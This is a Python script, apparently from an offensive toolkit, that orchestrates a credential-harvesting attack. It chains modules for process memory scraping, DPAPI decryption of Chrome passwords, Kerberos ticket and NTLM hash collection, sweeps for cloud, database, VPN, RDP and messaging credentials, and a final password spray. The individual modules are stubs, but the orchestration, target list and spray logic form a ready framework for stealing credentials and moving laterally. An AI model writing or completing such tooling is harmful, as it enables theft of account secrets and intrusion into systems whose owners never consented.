import os
import sys
import json
import time
import socket
import hashlib
import platform

def run_full_credential_harvest():
    """Phase 3 orchestrator — runs all credential harvesting modules in sequence.
    Order: Process Memory → DPAPI → Kerberos → Filesystem Sweep → App Credentials → Credential Spray.
    Aggregates all findings into a unified credential store.
    Deduplicates credentials and calculates coverage score.
    """
    results = {
        'host': socket.gethostname(),
        'user': os.environ.get('USER', os.environ.get('USERNAME', '?')),
        'system': platform.system(),
        'timestamp': time.time(),
        'phases': [],
        'unified_credentials': [],
        'targets_discovered': [],
    }

    # Phase tracking
    def run_phase(name, func):
        start = time.time()
        try:
            data = func()
            elapsed = time.time() - start
            results['phases'].append({'name': name, 'status': 'ok', 'elapsed': round(elapsed, 2), 'findings': count_findings(data)})
            return data
        except Exception as e:
            elapsed = time.time() - start
            results['phases'].append({'name': name, 'status': 'error', 'elapsed': round(elapsed, 2), 'error': str(e)[:200]})
            return None

    def count_findings(data):
        if not data or not isinstance(data, dict):
            return 0
        count = 0
        for v in data.values():
            if isinstance(v, list):
                count += len(v)
            elif isinstance(v, dict) and 'summary' not in str(v):
                count += 1
        return count

    # Credential deduplication
    seen_creds = set()
    def add_credential(username, password_or_hash, source, cred_type='password'):
        key = (username, password_or_hash, cred_type)
        if key not in seen_creds:
            seen_creds.add(key)
            results['unified_credentials'].append({
                'username': username,
                'credential': password_or_hash if cred_type != 'password' else password_or_hash[:3] + '***' if password_or_hash else None,
                'type': cred_type,
                'source': source,
            })

    # Phase 1: Process Memory
    print('[*] Phase 1: Process Memory Extraction')
    mem_data = run_phase('process_memory', lambda: _stub_phase('process_memory'))
    if mem_data:
        for cred in mem_data.get('credentials_found', []):
            if 'password' in cred.get('pattern', '').lower():
                add_credential('unknown', cred.get('value', ''), 'process_memory', 'password')
            elif 'token' in cred.get('pattern', '').lower():
                add_credential('unknown', cred.get('value', ''), 'process_memory', 'token')

    # Phase 2: DPAPI
    print('[*] Phase 2: DPAPI Credential Decryption')
    dpapi_data = run_phase('dpapi', lambda: _stub_phase('dpapi'))
    if dpapi_data:
        for pwd in dpapi_data.get('chrome_passwords', []):
            add_credential(pwd.get('username', ''), pwd.get('password', ''), 'dpapi_chrome', 'password')

    # Phase 3: Kerberos
    print('[*] Phase 3: Kerberos Ticket Harvesting')
    krb_data = run_phase('kerberos', lambda: _stub_phase('kerberos'))
    if krb_data:
        for ticket in krb_data.get('tickets', []):
            add_credential(ticket.get('client', ''), ticket.get('server', ''), 'kerberos', 'ticket')
        for ntlm in krb_data.get('ntlm_hashes', []):
            add_credential(ntlm.get('user', ''), ntlm.get('full_hash', ''), 'shadow', 'hash')

    # Phase 4: Filesystem Sweep
    print('[*] Phase 4: Filesystem Credential Sweep')
    fs_data = run_phase('filesystem', lambda: _stub_phase('filesystem'))
    if fs_data:
        for cloud in fs_data.get('cloud_configs', []):
            add_credential(cloud.get('name', ''), f'config:{cloud.get("path", "")}', 'filesystem', 'config_file')
        for db in fs_data.get('database_configs', []):
            add_credential(db.get('type', ''), f'config:{db.get("path", "")}', 'filesystem', 'db_config')

    # Phase 5: Application Credentials
    print('[*] Phase 5: Application Credential Harvest')
    app_data = run_phase('app_credentials', lambda: _stub_phase('app_credentials'))
    if app_data:
        for vpn in app_data.get('vpn_configs', []):
            if vpn.get('has_embedded_key') or vpn.get('has_private_key'):
                add_credential(vpn.get('type', ''), f'vpn:{vpn.get("path", "")}', 'app_vpn', 'vpn_key')
        for rdp in app_data.get('rdp_files', []):
            if rdp.get('has_password'):
                add_credential(rdp.get('username', ''), f'rdp:{rdp.get("server", "")}', 'app_rdp', 'rdp_cred')
        for msg in app_data.get('messaging_tokens', []):
            if msg.get('tokens_found'):
                add_credential(msg.get('app', ''), msg.get('token_preview', ''), 'app_messaging', 'token')

    # Phase 6: Credential Spray (requires results from phases 1-5)
    print('[*] Phase 6: Credential Spray (password reuse test)')
    if results['unified_credentials']:
        spray_creds = [{'username': c['username'], 'password': c['credential']}
                       for c in results['unified_credentials'] if c['type'] == 'password' and c['credential']]
        spray_result = run_phase('credential_spray', lambda: {'note': f'{len(spray_creds)} credentials ready for spray'})
    else:
        results['phases'].append({'name': 'credential_spray', 'status': 'skipped', 'reason': 'no credentials harvested'})

    # Coverage score
    phase_count = len([p for p in results['phases'] if p['status'] == 'ok'])
    total_phases = len(results['phases'])
    results['coverage_score'] = round(phase_count / max(total_phases, 1) * 100, 1)

    results['summary'] = {
        'phases_run': total_phases,
        'phases_successful': phase_count,
        'unique_credentials': len(results['unified_credentials']),
        'credential_types': list(set(c['type'] for c in results['unified_credentials'])),
        'coverage_score': results['coverage_score'],
    }
    return results

def _stub_phase(name):
    """Stub for standalone execution — in real use, each phase calls its actual module."""
    return {'note': f'{name} module would execute here', 'findings': []}

if __name__ == '__main__':
    out = run_full_credential_harvest()
    print(json.dumps(out, indent=2, default=str))
